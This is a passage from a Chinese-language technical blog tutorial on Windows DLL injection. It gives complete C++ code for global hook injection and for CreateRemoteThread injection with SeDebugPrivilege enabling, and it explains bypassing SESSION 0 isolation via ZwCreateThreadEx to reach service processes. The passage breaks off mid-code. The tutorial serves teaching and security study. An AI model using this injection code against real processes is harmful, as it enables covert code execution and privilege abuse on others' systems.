lParam)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ::<span class="hljs-built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);<br>&#125;<br><br><br><span class="hljs-comment">// 设置全局钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>g_hHook = ::<span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == g_hHook)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-comment">// 卸载钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">UnsetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (g_hHook)<br>&#123;<br>::<span class="hljs-built_in">UnhookWindowsHookEx</span>(g_hHook);<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>运行后成功注入到某些进程中</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-151703.png" alt="屏幕截图-151703"></p><h3 id="远线程注入"><a href="#远线程注入" class="headerlink" title="远线程注入"></a><strong>远线程注入</strong></h3><p>远线程注入是指一个进程在另一个进程中创建线程的技术。</p><p>远线程注入DLL之所以能称为远线程，是由于它使用关键函数<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>来在其他进程空间中创建一个线程。</p><h4 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h4><p>首先，程序在加载一个DLL时，它通常调用LoadLibrary函数来实现DLL的动态加载。<br>然后，再看下创建远线程的函数CreateRemoteThread的声明</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HANDLE <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  HANDLE                 hProcess,                       <span class="hljs-comment">//要在其中创建线程的进程句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,            <span class="hljs-comment">//指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  SIZE_T                 dwStackSize,                   <span class="hljs-comment">//堆栈的初始大小</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,         <span class="hljs-comment">//*远程进程中线程的起始地址*</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  LPVOID                 lpParameter,            <span class="hljs-comment">//*指向要传递给线程函数的变量的指针*</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD                  dwCreationFlags,               <span class="hljs-comment">//控制线程创建的标志</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [out] LPDWORD                lpThreadId                     <span class="hljs-comment">//指向接收线程标识符的变量的指针</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>从声明中可以知道，CreateRemoteThread需要传递的是目标进程空间中的多线程函数地址，以及多线程参数，其中参数类型是空指针类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure><p>如果程序能够获取目标进程LoadLibrary函数的地址，而且还能够获取目标进程空间中某个DLL路径字符串的地址，那么，可将LoadLibrary函数的地址作为多线程函数的地址，某个DLL路径字符串作为多线程函数的参数，并传递给CreateRemoteThread函数在目标进程空间中创建一个多线程。</p><p>所以需要解决以下两个问题:</p><p> 一、目标进程空间中LoadLibrary函数的地址是多少?</p><p>由于Windows引入了基址随机化ASLR安全机制，所以导致每次开机时系统DLL的加载地址都不一样，从而导致了DLL导出函数的地址也不一样。但有些系统DLL（例如kernel32.dll，ntdll.dll）的加载基地址，要求系统启动之后必须固定，如果系统重新启动，则其地址可以不同。也就是说，虽然进程不同，但是开机后，kernel32.dll的加载基址在各个进程都是相同的，因此导出函数的地址也相同。所以，<strong>自己程序空间的LoadLibrary函数地址(kernel32.dll)和其他进程空间的LoadLibrary函数地址(kernel32.dll)相同</strong>。</p><p> 二、如何向目标进程空间中写入DLL路径字符串数据</p><p>直接调用VirtualAllocEx函数在目标进程空间中申请一块内存，然后再调用WriteProcessMemory函数将指定的DLL路径写入目标进程空间中。</p><h4 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h4><p><strong>项目架构</strong></p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221026104242492.png" alt="image-20221026104242492"></p><p><strong>Dll1</strong>（要注入到目标程序的dll）dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;This Is From Dll!\nInject Success!&quot;</span>), <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;OK&quot;</span>), MB_OK);<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;This I222Inject Success!&quot;</span>), <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;OK&quot;</span>), MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>CreateRemoteThread</strong>（操作注入的程序）</p><p>AdjustTokenPrivilegesTest.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _ADJUST_TOKEN_PRIVILEGES_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ADJUST_TOKEN_PRIVILEGES_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>InjectDll.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _INJECT_DLL_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _INJECT_DLL_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">// 使用 CreateRemoteThread 实现远线程注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInjectDll</span><span class="hljs-params">(DWORD dwProcessId, <span class="hljs-type">char</span>* pszDllFileName)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>CreateRemoteThread.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// CreateRemoteThread.cpp : 定义控制台应用程序的入口点。</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;InjectDll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;AdjustTokenPrivilegesTest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-comment">// 提升当前进程令牌权限</span><br><span class="hljs-built_in">EnbalePrivileges</span>(::<span class="hljs-built_in">GetCurrentProcess</span>(), SE_DEBUG_NAME);<br><span class="hljs-comment">// 远线程注入 DLL</span><br>    <span class="hljs-comment">//带注入的进程pid，以及要注入的dll路径（根据实际要求需修改）</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _WIN64</span><br>BOOL bRet = <span class="hljs-built_in">CreateRemoteThreadInjectDll</span>(<span class="hljs-number">4316</span>, <span class="hljs-string">&quot;C:\\C++\\winhack\\remotedll\\001\\001.dll&quot;</span>);    <span class="hljs-comment">//32位</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> </span><br>BOOL bRet = <span class="hljs-built_in">CreateRemoteThreadInjectDll</span>(<span class="hljs-number">6676</span>, <span class="hljs-string">&quot;C:\\C++\\winhack\\remotedll\\001\\x64\\Release\\001.dll&quot;</span>);<span class="hljs-comment">//64位</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject Dll Error.\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject Dll OK.\n&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AdjustTokenPrivilegesTest.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;AdjustTokenPrivilegesTest.h&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EP_ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>LUID luidValue = &#123; <span class="hljs-number">0</span> &#125;;<br>TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span><br>bRet = ::<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;OpenProcessToken&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span><br>bRet = ::<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, pszPrivilegesName, &amp;luidValue);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;LookupPrivilegeValue&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置提升权限信息</span><br>tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-comment">// 提升进程令牌访问权限</span><br>bRet = ::<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;AdjustTokenPrivileges&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">// 根据错误码判断是否特权都设置成功</span><br>dwRet = ::<span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">if</span> (ERROR_SUCCESS == dwRet)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>InjectDll.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;InjectDll.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><br><br><span class="hljs-comment">// 使用 CreateRemoteThread 实现远线程注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInjectDll</span><span class="hljs-params">(DWORD dwProcessId, <span class="hljs-type">char</span>* pszDllFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>SIZE_T dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 打开注入进程，获取进程句柄</span><br>hProcess = ::<span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hProcess)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenProcess&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 在注入进程中申请内存</span><br>dwSize = <span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlen</span>(pszDllFileName);<br>pDllAddr = ::<span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pDllAddr)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualAllocEx&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 向申请的内存中写入数据</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="hljs-literal">NULL</span>))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;WriteProcessMemory&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取LoadLibraryA函数地址</span><br>pFuncProcAddr = ::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFuncProcAddr)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;GetProcAddress_LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 使用 CreateRemoteThread 创建远线程, 实现 DLL 注入</span><br>HANDLE hRemoteThread = ::<span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hRemoteThread)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateRemoteThread&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 关闭句柄</span><br>::<span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>未运行前，待注入程序ConsoleApplication1.exe没有加载Dll1.dll</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221026110132995.png" alt="image-20221026110132995"></p><p>运行后（管理员权限），成功注入ConsoleApplication1.exe到中</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221026110328186.png" alt="image-20221026110328186"></p><h3 id="突破SESSION-0隔离的远线程注入"><a href="#突破SESSION-0隔离的远线程注入" class="headerlink" title="突破SESSION 0隔离的远线程注入"></a><strong>突破SESSION 0隔离的远线程注入</strong></h3><p>传统的远线程注入不能成功注入到一些系统服务进程，这是由于系统存在SESSION 0隔离的安全机制，传统的远线程注入DLL方法并不<br>能突破SESSION 0隔离。直接调用ZwCreateThreadEx函数可以进行远线程注人，还可突破SESSIONO隔离，成功注入。</p><h4 id="关于SESSION-0隔离"><a href="#关于SESSION-0隔离" class="headerlink" title="关于SESSION 0隔离"></a>关于SESSION 0隔离</h4><p>在Windows XP、Windows Server  2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0，如下图所示，在Windows Vista之前，Session 0不仅包含服务，也包含标准用户应用程序。</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221026140001346.png" alt="image-20221026140001346"></p><p>将服务和用户应用程序一起在Session 0中运行会导致安全风险，因为服务会使用提升后的权限运行，而用户应用程序使用用户特权（大部分都是非管理员用户）运行，这会使得恶意软件以某个服务为攻击目标，通过“劫持”该服务，达到提升自己权限级别的目的。</p><p>从Windows Vista开始，只有服务可以托管到Session  0中，用户应用程序和服务之间会被隔离，并需要运行在用户登录到系统时创建的后续会话中。例如第一个登录的用户创建 Session  1，第二个登录的用户创建Session 2，以此类推，如下图所示。</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221026140036941.png" alt="image-20221026140036941"></p><h4 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h4><p>与传统的CreateRemoteThread函数实现的远线程注入 DLL 的唯一一个区别就是，突破SESSION 0隔离的远线程注入是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来实现创建远线程，而具体的远线程注入<strong>原理是相同的</strong>。其中，<strong>ZwCreateThreadEx在ntdll.dll中<em>并没有声明</em>，所以我们需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址</strong>。</p><p>通过调用CreateRemoteThread函数创建远线程的方式在内核6.0（WindowsVISTA、7、8等）以前是完全没有间题的，但是在内核6.0以后引入了会话隔离机制。它在创建一个进程之后并不立即运行，而是先挂起进程，在查看要运行的进程所在的会话层之后再决定是否恢复进程运行。</p><p><strong>经过跟踪CreateRemoteThread函数和逆向分析，发现内部调用ZwCreateThreadEx函数创建远线程的时候，第七个参CreateSuspended（CreateThreadFlags）值为1，它会导致线程创建完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。</strong></p><p>所以，要想使系统服务进程远线程注人成功，需要直接调用ZwCreateThreadEx函数，将第七个参数CreateSuspended（CreateThreadFlags）的值置为零，这样线程创建完成后就会恢复运行，注入成功。</p><h4 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h4><p><strong>项目架构</strong></p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221027093107602.png" alt="image-20221027093107602"></p><p><strong>Dll1</strong>（要注入到目标程序的dll）</p><p>同上一个项目，但由于会话隔离，在系统服务程序里不能显示程序窗体，也不能用常规方式创建用户进程。</p><p><strong>ZwCreateThreadEx</strong>（操作注入的程序）</p><p>AdjustTokenPrivilegesTest.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _ADJUST_TOKEN_PRIVILEGES_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ADJUST_TOKEN_PRIVILEGES_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>InjectDll.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _INJECT_DLL_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _INJECT_DLL_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">// 使用 ZwCreateThreadEx 实现远线程注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">ZwCreateThreadExInjectDll</span><span class="hljs-params">(DWORD dwProcessId, <span class="hljs-type">char</span>* pszDllFileName)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>ZwCreateThreadEx.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 